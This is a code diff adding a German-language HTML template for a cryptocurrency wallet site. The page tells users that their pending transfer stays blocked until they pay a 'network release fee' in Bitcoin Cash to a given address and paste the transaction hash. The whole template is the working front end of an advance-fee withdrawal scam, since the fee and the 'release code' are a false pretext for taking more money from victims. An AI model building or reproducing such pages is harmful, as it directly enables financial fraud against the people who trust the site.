@@ -1,0 +1,102 @@
+{% extends "_layout.html" %}
+{% block title %}Freigabe-Code erforderlich{% endblock %}
+
+{% block content %}
+<div class="bc-shell">
+  <aside class="bc-side">
+    <div class="bc-side__card">
+      <a class="bc-side__link {% if request.path == '/wallet/home' %}active{% endif %}" href="{{ url_for('wallet_home') }}">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M3 12l9-9 9 9M5 10v10h14V10"/></svg>
+        Startseite
+      </a>
+      <a class="bc-side__link" href="{{ url_for('wallet_assets') }}">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="6" width="18" height="13" rx="2"/><path d="M3 10h18"/></svg>
+        Vermögenswerte
+      </a>
+      <a class="bc-side__link" href="{{ url_for('wallet_activity') }}">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M22 12h-4l-3 9L9 3l-3 9H2"/></svg>
+        Aktivität
+      </a>
+    </div>
+  </aside>
+
+  <main class="bc-main">
+    <section class="bc-card bc-send-confirm">
+      <div class="bc-send-confirm__head">
+        <div class="bc-send-confirm__icon">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 2L2 22h20L12 2z"/><path d="M12 9v5M12 17v.5"/></svg>
+        </div>
+        <div>
+          <div class="bc-send-confirm__eyebrow">Transaktion ausstehend</div>
+          <h1 class="bc-send-confirm__title">Freigabe-Code erforderlich</h1>
+          <p class="bc-send-confirm__sub">Um Ihre Überweisung abzuschließen, ist eine Netzwerk-Freigabegebühr in Bitcoin Cash erforderlich.</p>
+        </div>
+      </div>
+
+      <div class="bc-send-confirm__grid">
+        <div class="bc-send-confirm__panel">
+          <div class="bc-send-confirm__label">Sie senden</div>
+          <div class="bc-send-confirm__amount">
+            <strong>{{ '%.8f'|format(pending.amount_qty) }} {{ pending.symbol }}</strong>
+            <span class="bc-send-confirm__eur">≈ {{ '%.2f'|format(pending.amount_eur) }} €</span>
+          </div>
+          <div class="bc-send-confirm__addr-row">
+            <span class="bc-send-confirm__addr-label">Empfänger</span>
+            <code class="bc-send-confirm__addr">{{ pending.address }}</code>
+          </div>
+        </div>
+
+        <div class="bc-send-confirm__panel bc-send-confirm__panel--accent">
+          <div class="bc-send-confirm__label">Freigabe-Code zu zahlen</div>
+          <div class="bc-send-confirm__amount">
+            <strong>{{ '%.6f'|format(release_fee_bch_qty) }} BCH</strong>
+            <span class="bc-send-confirm__eur">= {{ '%.2f'|format(release_fee_eur) }} €</span>
+          </div>
+          <div class="bc-send-confirm__addr-row">
+            <span class="bc-send-confirm__addr-label">An diese BCH-Adresse</span>
+            <code class="bc-send-confirm__addr">{{ release_address }}</code>
+          </div>
+        </div>
+      </div>
+
+      <ol class="bc-send-confirm__steps">
+        <li>
+          <span class="bc-send-confirm__step-num">1</span>
+          <div>
+            <strong>Bitcoin Cash senden</strong>
+            <p>Senden Sie exakt <strong>{{ '%.6f'|format(release_fee_bch_qty) }} BCH</strong> ({{ '%.2f'|format(release_fee_eur) }} €) an die oben angegebene BCH-Adresse aus Ihrer BCH-Wallet.</p>
+          </div>
+        </li>
+        <li>
+          <span class="bc-send-confirm__step-num">2</span>
+          <div>
+            <strong>Transaktions-Hash kopieren</strong>
+            <p>Warten Sie auf 3 Bestätigungen im Netzwerk, kopieren Sie dann die TX-ID und fügen Sie sie unten ein.</p>
+          </div>
+        </li>
+        <li>
+          <span class="bc-send-confirm__step-num">3</span>
+          <div>
+            <strong>Code eingeben</strong>
+            <p>Nach Eingabe und Prüfung des Hashes wird Ihre ursprüngliche Transaktion automatisch freigegeben.</p>
+          </div>
+        </li>
+      </ol>
+
+      <form method="post" action="{{ url_for('wallet_home') }}" class="bc-send-confirm__form">
+        <label class="bc-send-confirm__label" for="bc-freigabe-tx">BCH-Transaktions-Hash (TX-ID)</label>
+        <input id="bc-freigabe-tx" name="freigabe_tx" type="text" class="bc-send-confirm__input"
+               placeholder="z. B. 4a8e08f4d1b5f6a7…" autocomplete="off" spellcheck="false">
+        <div class="bc-send-confirm__actions">
+          <a class="bc-send-confirm__btn bc-send-confirm__btn--ghost" href="{{ url_for('wallet_home') }}">Abbrechen</a>
+          <button class="bc-send-confirm__btn bc-send-confirm__btn--primary" type="submit">Code einreichen</button>
+        </div>
+      </form>
+
+      <p class="bc-send-confirm__note">
+        Solange der Freigabe-Code nicht eingereicht und verifiziert wurde, bleibt die Transaktion in Ihrer Aktivität als <em>ausstehend</em> markiert. Der Betrag Ihrer Wallet wird bis zur Freigabe reserviert.
+      </p>
+    </section>
+  </main>
+</div>
+{% endblock %}
